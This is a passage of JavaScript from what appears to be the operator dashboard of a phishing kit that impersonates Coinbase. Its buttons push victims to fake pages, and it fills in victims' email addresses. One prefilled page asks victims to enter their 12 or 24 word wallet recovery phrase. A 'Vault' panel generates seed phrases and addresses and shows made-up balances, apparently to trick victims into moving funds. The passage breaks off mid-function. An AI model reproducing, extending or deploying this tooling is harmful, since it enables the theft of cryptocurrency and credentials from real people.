            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">Whitelist CB Wallet</span><span class="ps-roomy-sub" style="'+HEAD_S+'">whitelist wallet</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            var url='/coinbase/whitelist-coinbase-wallet';
            panel.innerHTML=
                '<div class="rp-action-row ex-preset-row wl-mode-row" data-wl-mode="coinbase">'
              +   '<button type="button" class="ps-toggle-btn wl-mode-btn ps-toggle-active" data-wl-mode="coinbase">Coinbase Wallet</button>'
              +   '<button type="button" class="ps-toggle-btn wl-mode-btn" data-wl-mode="trust">Trust Wallet</button>'
              +   '<button type="button" class="ps-toggle-btn wl-mode-btn" data-wl-mode="safepal">Safepal</button>'
              +   '<button type="button" class="ps-toggle-btn wl-mode-btn" data-wl-mode="other">Other</button>'
              + '</div>'
              + '<div class="ps-roomy-field-row ps-roomy-field-row--email" id="cb-wl-other-row" style="display:none;">'
              +   '<span class="rp-label">Other</span>'
              +   '<input type="text" class="rp-input ps-roomy-outline-input" id="cb-wl-freetext-inp" placeholder="" value="" autocomplete="off">'
              + '</div>'
              + PAGE_STATE_ROW
              + ACTION_ROW;
            bindPageStateRow(panel);
            var modeRow=panel.querySelector('.wl-mode-row');
            var modeBtns=panel.querySelectorAll('.wl-mode-btn');
            var otherRow=panel.querySelector('#cb-wl-other-row');
            var otherInp=panel.querySelector('#cb-wl-freetext-inp');
            function _wlSetMode(key){
                if(modeRow) modeRow.setAttribute('data-wl-mode',key);
                modeBtns.forEach(function(b){ b.classList.toggle('ps-toggle-active', (b.getAttribute('data-wl-mode')||'')===key); });
                if(otherRow) otherRow.style.display = (key==='other') ? '' : 'none';
                if(key!=='other' && otherInp) otherInp.value='';
            }
            modeBtns.forEach(function(mb){
                mb.onclick=function(){ _wlSetMode(mb.getAttribute('data-wl-mode')||'coinbase'); };
            });
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe(url); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                // Default redirect only — mode/custom not wired this pass
                var st = panel.dataset.pageState || 'default';
                sendCommand('redirect',{url:url,page_state:st});
                
                cbClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;cbClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
                if(!o && otherInp) otherInp.value='';
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();

        // Disconnect Wallets — TYPE 1 roomy; visitor Continue; extra dropdown option later
        (function(){
            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">Disconnect Wallets</span><span class="ps-roomy-sub" style="'+HEAD_S+'">disconnect a wallet from the vast selection</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            var url='/coinbase/disconnect-wallet';
            panel.innerHTML=ACTION_ROW;
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe(url); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                sendCommand('redirect',{url:url});
                
                cbClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;cbClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();

        //  Vault (section title removed — presentation only)
        // Create Vault — TYPE 1 roomy (Send|Preview only)
        (function(){
            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">Create Vault</span><span class="ps-roomy-sub" style="'+HEAD_S+'">create the vault self explanatory</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            var url='/coinbase/create-vault';
            panel.innerHTML=ACTION_ROW;
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe(url); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                sendCommand('redirect',{url:url});
                
                cbClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;cbClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();

        // Connect Vault — TYPE 1 roomy + Email field (visitor empty/PFP contract later)
        (function(){
            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">Connect Vault</span><span class="ps-roomy-sub" style="'+HEAD_S+'">connect vault</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            var url='/coinbase/connect-vault';
            panel.innerHTML=
                '<div class="ps-roomy-field-row ps-roomy-field-row--email">'
              +   '<span class="rp-label">Email</span>'
              +   '<input type="text" class="rp-input ps-roomy-outline-input" id="cb-cv-email-inp" placeholder="user@gmail.com" value="">'
              + '</div>'
              + ACTION_ROW;
            function _cvEmail(){ return (document.getElementById('cb-cv-email-inp')||{value:''}).value.trim(); }
            panel.querySelector('.rp-btn-preview').onclick=function(){
                var em=_cvEmail();
                if(em){_openPreviewIframe(url,{email:em});}
                else{_openPreviewIframe(url);}
            };
            panel.querySelector('.rp-btn-send').onclick=function(){
                var em=_cvEmail();
                if(em){sendCommand('redirect',{url:url,post:{email:em}});}
                else{sendCommand('redirect',{url:url});}
                
                cbClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;cbClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
                if(!o){
                    var _cvInp=document.getElementById('cb-cv-email-inp');
                    if(_cvInp) _cvInp.value='';
                }
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();

        // Disconnect wallet (Seeds /coinbase/seed) — TYPE 2 roomy; Send is GET + page_state; Preview still Keep-default post
        (function(){
            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">Disconnect wallet</span><span class="ps-roomy-sub" style="'+HEAD_S+'">disconnect the unnamed wallet</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            var url='/coinbase/seed';
            var POST={
                _title:'Disconnect wallet from your account',
                _sub:'Enter the 12 or 24 word recovery phrase from your external wallet to disconnect your wallet from your Coinbase account.',
                _btn:'Continue'
            };
            panel.innerHTML=PAGE_STATE_ROW+ACTION_ROW;
            bindPageStateRow(panel);
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe(url,POST); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                var st = panel.dataset.pageState || 'default';
                sendCommand('redirect',{url:url, page_state: st});
                
                cbClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;cbClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();

        // Select Vault Assets — TYPE 1 roomy; Keep-default copy post preserved (btn → Continue)
        (function(){
            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">Select Vault Assets</span><span class="ps-roomy-sub" style="'+HEAD_S+'">select assets</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            var url='/coinbase/select-vault-assets';
            var POST={
                _title:'Select assets to include in your vault',
                _sub:'Select the assets you want to include in your vault. You can always add more later.',
                _btn:'Continue'
            };
            panel.innerHTML=ACTION_ROW;
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe(url,POST); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                sendCommand('redirect',{url:url,post:POST});
                
                cbClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;cbClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();

        //  Vault Balance (wallet generator + live update) — TYPE 1 roomy design shell
        (function(){
            var _lastMnemonic='';
            var _generatedAddrs={};

            // Coin catalog loaded from /coinbase_assets.json via global _loadCoinCatalog()

            // Start empty — state is loaded lazily when the panel is first opened (avoids boot-time bleed)
            var _activeKeys = [];
            var _data = {};
            var _restoredMnemonic = '';
            var _restoredGeneratedAddrs = {};

            // Lazily load state from globals/localStorage when panel opens
            function _cbRestoreFromGlobals() {
                if (window._vbAdminKeys && window._vbAdminKeys.length) {
                    _activeKeys = window._vbAdminKeys.slice();
                } else {
                    _activeKeys = [];
                }
                _data = {};
                if (window._vbAdminData) {
                    Object.keys(window._vbAdminData).forEach(function(k){
                        _data[k] = {addr: window._vbAdminData[k].addr||'', amt: window._vbAdminData[k].amt||'0'};
                    });
                }
                _restoredMnemonic = window._vbAdminMnemonic || '';
                _restoredGeneratedAddrs = window._vbAdminGeneratedAddrs ? JSON.parse(JSON.stringify(window._vbAdminGeneratedAddrs)) : {};
            }

            // Reset hook — called on session switch so closure vars don't bleed into new sessions
            window._vbResetCoinbasePanel = function() {
                _activeKeys = []; _data = {}; _lastMnemonic = ''; _generatedAddrs = {};
                _restoredMnemonic = ''; _restoredGeneratedAddrs = {};
                // Clear DOM so old session data is never visible
                if (coinRowsWrap) coinRowsWrap.innerHTML = '';
                if (seedBox) { seedBox.style.display = 'none'; }
                if (seedWords) seedWords.innerHTML = '';
                if (genStatus) { genStatus.textContent = ''; genStatus.style.color = ''; }
                if (genOut) { genOut.value = ''; }
                if (genBtn) { genBtn.disabled = false; genBtn.classList.remove('is-busy'); }
            };

            // Re-register global vault-panel hooks pointing at THIS (Coinbase) IIFE's closure vars.
            // Called on panel open and on session switch so CC catalog callback can't permanently
            // hijack _vbSetAdminKeys / _vbAddAdminKey with CC closure pointers.
            window._vbReRegisterCoinbaseGlobals = function() {
                window._vbSetAdminKeys = function(keys) {
                    if (window._vbAdminData) {
                        Object.keys(window._vbAdminData).forEach(function(k) {
                            if (!_data[k]) _data[k] = {addr:'', amt:'0'};
                            if (window._vbAdminData[k].addr) _data[k].addr = window._vbAdminData[k].addr;
                            if (window._vbAdminData[k].amt)  _data[k].amt  = window._vbAdminData[k].amt;
                        });
                    }
                    _activeKeys = keys.slice();
                    _syncWindowState();
                    _renderCoinRows();
                };
                window._vbAddAdminKey = function(key) {
                    if (_activeKeys.indexOf(key) !== -1) return;
                    if (window._vbAdminData) {
                        Object.keys(window._vbAdminData).forEach(function(k) {
                            if (!_data[k]) _data[k] = {addr:'', amt:'0'};
                            if (window._vbAdminData[k].addr) _data[k].addr = window._vbAdminData[k].addr;
                            if (window._vbAdminData[k].amt)  _data[k].amt  = window._vbAdminData[k].amt;
                        });
                    }
                    if (!_data[key]) _data[key] = {addr:'', amt:'0'};
                    if (_generatedAddrs && _generatedAddrs[key]) _data[key].addr = _generatedAddrs[key];
                    _activeKeys.push(key);
                    _syncWindowState();
                    _renderCoinRows();
                };
            };
            // Register immediately so session switch can call it even before panel opens
            window._vbReRegisterCoinbaseGlobals();

            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card vb-roomy';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">Vault</span><span class="ps-roomy-sub" style="'+HEAD_S+'">vault balance</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';

            //  Static top HTML (presentation chrome only — generate / add handlers unchanged)
            var h='';
            h+='<div class="vb-gen-chrome">';
            h+='<div class="vb-gen-label">Vault</div>';
            h+='<div class="vb-gen-field-row">';
            h+='<div class="vb-gen-box">';
            h+='<input type="text" class="vb-gen-out" readonly placeholder="" value="" spellcheck="false" autocomplete="off">';
            h+='<button type="button" class="vb-gen-btn" title="Generate New Wallet" aria-label="Generate New Wallet">';
            h+='<svg class="vb-gen-spin-ico" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-2.64-6.36"/><polyline points="21 3 21 9 15 9"/></svg>';
            h+='</button>';
            h+='</div>';
            // Future: quick-load predefined 5 assets (tickers TBD later) — design chrome only now
            h+='<button type="button" class="vb-addr-scan-dd" disabled title="Address scan (later)" aria-disabled="true" aria-label="Address scan (later)">';
            h+='<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>';
            h+='</button>';
            h+='</div>';
            h+='<div class="vb-gen-status"></div>';
            h+='</div>';
            // Legacy seed-box markup kept for master (always hidden) — phrase displays in .vb-gen-out
            if (window.ADMIN_ROLE === 'master') {
                h+='<div class="vb-seed-box" style="display:none;">';
                h+='<button type="button" class="vb-copy-seed-btn" style="display:none;">Copy All</button>';
                h+='<div class="vb-seed-words" style="display:none;"></div></div>';
            }
            // Coin rows container + add button
            h+='<div class="vb-coin-rows"></div>';
            h+='<div class="vb-add-wrap">';
            h+='<button type="button" class="vb-add-btn" title="Add Coin" aria-label="Add Coin">+</button>';
            h+='<div class="vb-add-dropdown" style="display:none;"></div>';
            h+='</div>';
            h+=ACTION_ROW;
            panel.innerHTML=h;

            var seedBox=panel.querySelector('.vb-seed-box');
            var seedWords=panel.querySelector('.vb-seed-words');
            var copySeedBtn=panel.querySelector('.vb-copy-seed-btn');
            var genBtn=panel.querySelector('.vb-gen-btn');
            var genOut=panel.querySelector('.vb-gen-out');
            var genStatus=panel.querySelector('.vb-gen-status');
            var priceStatus=panel.querySelector('.vb-price-status');
            var coinRowsWrap=panel.querySelector('.vb-coin-rows');
            var addBtn=panel.querySelector('.vb-add-btn');
            var addDropdown=panel.querySelector('.vb-add-dropdown');

            function _syncGenOut(){
                if(!genOut)return;
                var shown='';
                // Master: phrase is the primary top-field display (selectable). Never use "Wallet generated".
                if(window.ADMIN_ROLE==='master' && _lastMnemonic){
                    shown=_lastMnemonic;
                } else {
                    for(var i=0;i<_activeKeys.length;i++){
                        var k=_activeKeys[i];
                        if(_data[k]&&_data[k].addr){shown=_data[k].addr;break;}
                    }
                }
                genOut.value=shown;
            }
            function _hideSeedBox(){
                if(seedBox) seedBox.style.display='none';
                if(seedWords) seedWords.innerHTML='';
            }
            function _hideAddDropdown(){
                if(!addDropdown)return;
                addDropdown.style.display='none';
                // Return to wrap so roomy card teardown doesn't leave a body orphan
                if(addDropdown.parentNode!==addBtn.parentNode && addBtn.parentNode){
                    addBtn.parentNode.appendChild(addDropdown);
                }
            }
            function _positionAddDropdown(){
                if(!addDropdown||!addBtn)return;
                var rect=addBtn.getBoundingClientRect();
                var dropW=Math.max(rect.width,280);
                var leftPos=Math.min(rect.left, window.innerWidth-dropW-8);
                var spaceAbove=rect.top-8;
                var spaceBelow=window.innerHeight-rect.bottom-8;
                // Port to body while open — escapes roomy overflow + overlay transform clipping
                if(addDropdown.parentNode!==document.body){
                    document.body.appendChild(addDropdown);
                }
                addDropdown.style.position='fixed';
                addDropdown.style.left=Math.max(8,leftPos)+'px';
                addDropdown.style.width=dropW+'px';
                addDropdown.style.right='auto';
                addDropdown.style.zIndex='99999';
                addDropdown.style.overflowY='auto';
                addDropdown.style.background='#1a1d23';
                addDropdown.style.border='1px solid rgba(255,255,255,.12)';
                addDropdown.style.borderRadius='6px';
                addDropdown.style.boxShadow='0 4px 20px rgba(0,0,0,.7)';
                if(spaceAbove>=120||spaceAbove>=spaceBelow){
                    addDropdown.style.bottom=(window.innerHeight-rect.top+4)+'px';
                    addDropdown.style.top='auto';
                    addDropdown.style.maxHeight=Math.min(220,Math.max(spaceAbove,80))+'px';
                } else {
                    addDropdown.style.top=(rect.bottom+4)+'px';
                    addDropdown.style.bottom='auto';
                    addDropdown.style.maxHeight=Math.min(220,Math.max(spaceBelow,80))+'px';
                }
            }

            //  Price fetch 
            function _fetchPricesAndShow(){
                if(priceStatus)priceStatus.textContent='Fetching live prices...';
                _fetchVaultPrices(function(){
                    if(priceStatus){priceStatus.style.color='#4ade80';priceStatus.textContent=' Live prices loaded';setTimeout(function(){priceStatus.textContent='';},2500);}
                });
            }

            //  Network variant families (USDT / USDC only) 
            var _netFamilies={
                'usdt':        {family:['usdt','usdt_trc20'],labels:{'usdt':'ERC-20 (Ethereum)','usdt_trc20':'TRC-20 (Tron)'}},
                'usdt_trc20':  {family:['usdt','usdt_trc20'],labels:{'usdt':'ERC-20 (Ethereum)','usdt_trc20':'TRC-20 (Tron)'}},
                'usdc':        {family:['usdc','usdc_base','usdc_sol','usdc_polygon'],labels:{'usdc':'ERC-20 (Ethereum)','usdc_base':'Base (Base)','usdc_sol':'SPL (Solana)','usdc_polygon':'ERC-20 (Polygon)'}},
                'usdc_base':   {family:['usdc','usdc_base','usdc_sol','usdc_polygon'],labels:{'usdc':'ERC-20 (Ethereum)','usdc_base':'Base (Base)','usdc_sol':'SPL (Solana)','usdc_polygon':'ERC-20 (Polygon)'}},
                'usdc_sol':    {family:['usdc','usdc_base','usdc_sol','usdc_polygon'],labels:{'usdc':'ERC-20 (Ethereum)','usdc_base':'Base (Base)','usdc_sol':'SPL (Solana)','usdc_polygon':'ERC-20 (Polygon)'}},
                'usdc_polygon':{family:['usdc','usdc_base','usdc_sol','usdc_polygon'],labels:{'usdc':'ERC-20 (Ethereum)','usdc_base':'Base (Base)','usdc_sol':'SPL (Solana)','usdc_polygon':'ERC-20 (Polygon)'}},
            };

            //  Build coin row element 
            function _mkCoinRow(key){
                var c=_vaultCoinMap[key];if(!c)return null;
                if(!_data[key])_data[key]={addr:'',amt:'0'};
                var wrap=document.createElement('div');
                wrap.className='vb-coin-row';
                wrap.setAttribute('data-vb-coin',key);

                // Header: icon + name + X
                var header=document.createElement('div');
                header.className='vb-coin-row-head';
                var icoWrap=document.createElement('div');
                icoWrap.className='vb-coin-ico';
                var icoImg=document.createElement('img');
                icoImg.src=c.iconUrl||'';
                icoImg.width=icoImg.height=18;
                icoImg.className='vb-coin-ico-img';
                icoImg.onerror=function(){icoImg.style.display='none';};
                icoWrap.appendChild(icoImg);
                var lbl=document.createElement('span');
                lbl.className='vb-coin-lbl';
                lbl.textContent=c.label+' ('+c.ticker+')';
                var rmBtn=document.createElement('button');
                rmBtn.type='button';
                rmBtn.className='vb-coin-rm';
                rmBtn.title='Remove '+c.label;
                rmBtn.textContent='X';
                rmBtn.addEventListener('click',function(){
                    _activeKeys=_activeKeys.filter(function(k){return k!==key;});
                    _renderCoinRows();_syncWindowState();
                });
                header.appendChild(icoWrap);header.appendChild(lbl);header.appendChild(rmBtn);

                // Single row: address + copy + amount + USD input + USD label
                var inputRow=document.createElement('div');
                inputRow.className='vb-coin-row-inputs';
                var addrInp=document.createElement('input');
                addrInp.type='text';addrInp.className='rp-input vb-addr-inp';
                addrInp.placeholder='Address';
                addrInp.value=_data[key].addr||'';
                addrInp.addEventListener('input',function(){_data[key].addr=addrInp.value;_syncWindowState();});
                var copyBtn2=document.createElement('button');
                copyBtn2.title='Copy address';
                copyBtn2.style.cssText='background:none;border:none;color:rgba(255,255,255,.35);font-size:11px;cursor:pointer;padding:0 2px;flex-shrink:0;line-height:1;';
                copyBtn2.innerHTML='<svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>';
                copyBtn2.addEventListener('click',function(){
                    if(!addrInp.value)return;
                    navigator.clipboard.writeText(addrInp.value).then(function(){
                        copyBtn2.innerHTML='<svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>';
                        setTimeout(function(){copyBtn2.innerHTML='<svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>';},1400);
                    }).catch(function(){});
                });
                var amtInp=document.createElement('input');
                amtInp.type='text';amtInp.className='rp-input';
                amtInp.placeholder='Amount';
                amtInp.style.cssText='width:62px;font-size:9px;padding:3px 5px;flex-shrink:0;';
                amtInp.value=_data[key].amt||'';
                var usdInpR=document.createElement('input');
                usdInpR.type='text';usdInpR.className='rp-input';
                usdInpR.placeholder='USD $';
                usdInpR.style.cssText='width:54px;font-size:9px;padding:3px 5px;flex-shrink:0;';
                var usdLblR=document.createElement('span');
                usdLblR.style.cssText='font-family:monospace;font-size:8px;color:rgba(255,255,255,.3);flex-shrink:0;';
                usdLblR.textContent='$';
                (function(k,aInp,uInp){
                    _fetchVaultPrices(function(){
                        var p=_vaultPrices[k]||0;var n=parseFloat(aInp.value);
                        if(p&&!isNaN(n)&&n)uInp.value=(n*p).toFixed(2);
                    });
                    aInp.addEventListener('input',function(){
                        _data[k].amt=aInp.value;_syncWindowState();
                        var p=_vaultPrices[k]||0;var n=parseFloat(aInp.value);
                        uInp.value=(p&&!isNaN(n))?(n*p).toFixed(2):'';
                    });
                    uInp.addEventListener('input',function(){
                        var p=_vaultPrices[k]||0;var usd=parseFloat(uInp.value);
                        if(p&&!isNaN(usd)){aInp.value=parseFloat((usd/p).toPrecision(8)).toString();}
                        else{aInp.value='';}
                        _data[k].amt=aInp.value;_syncWindowState();
                    });
                })(key,amtInp,usdInpR);
                inputRow.appendChild(addrInp);inputRow.appendChild(copyBtn2);
                inputRow.appendChild(amtInp);inputRow.appendChild(usdInpR);inputRow.appendChild(usdLblR);

                wrap.appendChild(header);
                // Network switcher for USDT / USDC
                var netDef=_netFamilies[key];
                if(netDef){
                    var netRow=document.createElement('div');
                    netRow.style.cssText='display:flex;gap:3px;margin-bottom:4px;';
                    netDef.family.forEach(function(nk){
                        var nb=document.createElement('button');
                        nb.style.cssText='font-family:monospace;font-size:8px;padding:1px 6px;border-radius:3px;cursor:pointer;border:1px solid '
                            +(nk===key?'rgba(255,255,255,.4);background:rgba(255,255,255,.12);color:#fff;':'rgba(255,255,255,.12);background:none;color:rgba(255,255,255,.4);');
                        nb.textContent=netDef.labels[nk];
                        if(nk!==key){
                            nb.addEventListener('click',function(){
                                var idx=_activeKeys.indexOf(key);
                                if(idx!==-1){
                                    if(!_data[nk])_data[nk]={addr:'',amt:''};
                                    if(_generatedAddrs[nk])_data[nk].addr=_generatedAddrs[nk];
                                    _activeKeys[idx]=nk;
                                }
                                _renderCoinRows();_syncWindowState();
                            });
                        }
                        netRow.appendChild(nb);
                    });
                    wrap.appendChild(netRow);
                }
                wrap.appendChild(inputRow);
                return wrap;
            }

            function _renderCoinRows(){
                // Flush current DOM input values into _data before wiping rows
                if (coinRowsWrap) {
                    coinRowsWrap.querySelectorAll('[data-vb-coin]').forEach(function(cardEl){
                        var k=cardEl.getAttribute('data-vb-coin');
                        var aInp=cardEl.querySelector('.vb-addr-inp');
                        var mInp=cardEl.querySelector('input[placeholder="Amount"]');
                        if(!_data[k]) _data[k]={addr:'',amt:'0'};
                        if(aInp) _data[k].addr=aInp.value;
                        if(mInp) _data[k].amt=mInp.value;
                    });
                }
                // Only merge vault-panel globals if they belong to THIS brand (coinbase)
                if (window._vbAdminData && (window._vbBrand===''||window._vbBrand==='coinbase'||!window._vbBrand)) {
                    Object.keys(window._vbAdminData).forEach(function(k){
                        if (!_data[k]) _data[k]={addr:'',amt:'0'};
                        if (window._vbAdminData[k].addr) _data[k].addr=window._vbAdminData[k].addr;
                        if (window._vbAdminData[k].amt)  _data[k].amt =window._vbAdminData[k].amt;
                    });
                }
                coinRowsWrap.innerHTML='';
                if(!_activeKeys.length){
                    var empty=document.createElement('div');
                    empty.className='vb-empty';
                    empty.textContent='No assets';
                    coinRowsWrap.appendChild(empty);
                } else {
                    _activeKeys.forEach(function(key){
                        var el=_mkCoinRow(key);if(el)coinRowsWrap.appendChild(el);
                    });
                }
                _syncGenOut();
                _rebuildDropdown();
                // Only sync to globals when we actually have coins — avoids wiping globals on
                // IIFE init (overlay recreated) where _activeKeys is still empty
                if(typeof _syncWindowState==='function' && _activeKeys.length)_syncWindowState();
            }

            //  Add coin dropdown (with icons)

            // Restore mnemonic and generated addresses from saved state (phrase → top field via _syncGenOut)
            _lastMnemonic = _restoredMnemonic;
            _generatedAddrs = _restoredGeneratedAddrs;
            _hideSeedBox();

            var _ddSearchVal='';
            _renderCoinRows();
            function _rebuildDropdown(){
                addDropdown.innerHTML='';
                var catalog=_vbCoinCatalog.length?_vbCoinCatalog:[];
                var avail=catalog.filter(function(c){return _activeKeys.indexOf(c.key)===-1;});
                if(!avail.length&&!catalog.length){addBtn.style.display='none';_hideAddDropdown();return;}
                addBtn.style.display='block';

                // Search input at top of dropdown
                var srch=document.createElement('input');
                srch.type='text';srch.placeholder='Search coins...';
                srch.value=_ddSearchVal;
                srch.style.cssText='width:100%;box-sizing:border-box;padding:6px 8px;font-family:monospace;font-size:10px;background:#1a1d23;border:none;border-bottom:1px solid rgba(255,255,255,.1);color:#fff;outline:none;';
                srch.addEventListener('click',function(e){e.stopPropagation();});
                srch.addEventListener('input',function(){_ddSearchVal=srch.value;_rebuildDropdown();addDropdown.style.display='block';});
                addDropdown.appendChild(srch);

                var q=_ddSearchVal.toLowerCase().trim();
                var list=document.createElement('div');
                list.style.cssText='max-height:200px;overflow-y:auto;';
                if(!q){
                    var hint=document.createElement('div');
